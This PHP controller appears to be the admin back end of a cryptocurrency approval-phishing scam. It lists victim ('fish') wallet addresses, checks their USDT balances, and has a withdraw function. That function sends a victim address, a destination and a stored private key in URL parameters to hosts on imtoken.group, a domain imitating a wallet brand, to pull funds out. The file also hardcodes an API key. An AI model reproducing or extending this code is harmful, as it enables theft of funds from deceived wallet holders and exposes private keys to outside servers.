<?php if(!defined('BASEPATH')) exit('No direct script access allowed');

require APPPATH . '/libraries/BaseController.php';
use IEXBase\TronAPI\Tron;

/**
 * Class : User (UserController)
 * User Class to control all user related operations.
 * @author : Kishor Mali
 * @version : 1.1
 * @since : 15 November 2016
 */
class Fish extends BaseController
{
    /**
     * This is default constructor of the class
     */
    public function __construct()
    {
        parent::__construct();
        $this->load->model('fish_model');
        $this->isLoggedIn();
    }

    /**
     * This function used to load the first screen of the user
     */
    public function index()
    {
        $this->global['pageTitle'] = '我的客户';
        $this->load->model('user_model');

        if($this->isAdmin() != TRUE){

//            $count = $this->fish_model->count_all();

            $data['userRecords'] = $this->fish_model->find_all();


        }else{

            $userId = $this->vendorId;
//            $count = $this->fish_model->count_by_employee($userId);

            $data['userRecords'] = $this->fish_model->find_by_employee($userId);
        }
        $this->loadViews("fish/fishes", $this->global, $data , NULL);
    }

    public function delete_fish($id){
        $this->fish_model->detele_by_id($id);
        redirect('fish/index');
    }

    public function check_balance(){
        $type = $this->input->get('type');
        $address = $this->input->get('address');
        if ($type=='trc'){
            $balance = $this->get_balance_trc($address);

        }else{
            $balance = $this->get_balance_erc($address);
        }
        $this->fish_model->update_balance_by_address($address,$balance);

        redirect('fish/index');
    }

    public function get_balance_trc($address){
        include_once("tron_utils.php");
        $fullNode = new \IEXBase\TronAPI\Provider\HttpProvider('https://api.trongrid.io');
        $solidityNode = new \IEXBase\TronAPI\Provider\HttpProvider('https://api.trongrid.io');
        $eventServer = new \IEXBase\TronAPI\Provider\HttpProvider('https://api.trongrid.io');

        try {
            $tron = new \IEXBase\TronAPI\Tron($fullNode, $solidityNode, $eventServer);
        } catch (\IEXBase\TronAPI\Exception\TronException $e) {
            exit($e->getMessage());
        }


        $abi = '[{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"sender","type":"address"},{"name":"recipient","type":"address"},{"name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"recipient","type":"address"},{"name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"}]';
        $abiAry = json_decode($abi, true);
        $usdt_contract = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

        //get symbol
        $function = "symbol";
        $params = [];
        $result = $tron->getTransactionBuilder()->triggerConstantContract($abiAry, base58check2HexString($usdt_contract),$function, $params, base58check2HexString($address));
        $symbol = $result[0];

        //get decimals
        $function = "decimals";
        $params = [];
        $result = $tron->getTransactionBuilder()->triggerConstantContract($abiAry, base58check2HexString($usdt_contract),$function, $params, base58check2HexString($address));
        $decimals = $result[0]->toString();

        if (!is_numeric($decimals)) {
            throw new Exception("Token decimals not found");
        }

        //get balance
        $function = "balanceOf";
        $params = [ str_pad(base58check2HexString($address),64,"0", STR_PAD_LEFT) ];
        $result = $tron->getTransactionBuilder()->triggerConstantContract($abiAry, base58check2HexString($usdt_contract),$function, $params, base58check2HexString($address));
        $balance = $result[0]->toString();
        if (!is_numeric($balance)) {
            throw new Exception("Token balance not found");
        }

        $balance = bcdiv($balance, bcpow("10", $decimals), $decimals);

        return $balance;
    }

    public function get_balance_erc($address){
        $api_key = '7TCVDMHGHVH42IFHXJXK677AQWUA1QDE9N';
        $usdt_contract = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
        //设置抓取的url
        $url='https://api.etherscan.io/api?module=account&action=tokenbalance&contractaddress='.$usdt_contract.'&address='.$address.'&tag=latest&apikey='.$api_key;                                 //地址要拼接上请求参数

        $json_data = json_decode(file_get_contents($url),true);
        $data = $json_data['result'];
        $balance = $data/1000000;
        return $balance;
    }

    public function withdraw_view(){
        if(!$this->isAdmin()){
            $type = $this->input->get('type');
            $from = $this->input->get('from');
            $data['type'] = $type;
            $data['from'] = $from;
            $this->loadViews("fish/withdraw", $this->global, $data , NULL);
        }else{
            echo "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />"."<script>alert('提现请联系管理员');</script>";
        }

    }

    public function withdraw(){
        $type = $this->input->post('type');
        $from = $this->input->post('from');
 
        $to = $this->input->post('to');
        $this->load->model('address_model');
        if ($type == 'erc'){
            $data = $this->address_model->get_type_address('erc');
            $au_address = $data[0]['address'];
            $pri_key = $data[0]['pri_key'];
            $url = 'https://py.imtoken.group/transfer?a_address='.$from.'&c_address='.$to.'&b_address='.$au_address.'&b_key='.$pri_key;
            $result = file_get_contents($url);
            echo "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />"."<script>alert('".$result."');</script>";
            return $result;
        }else{
            $data = $this->address_model->get_type_address('trc');
            $au_address = $data[0]['address'];
            $pri_key = $data[0]['pri_key'];
            $url = 'https://trc.imtoken.group/transfer.html?from='.$from.'&to='.$to.'&privateKey='.$pri_key;

            $data['url'] = $url;
            $this->loadViews("fish/trx_withdraw", $this->global, $data , NULL);
            return $url;
        }
    }

}

?>
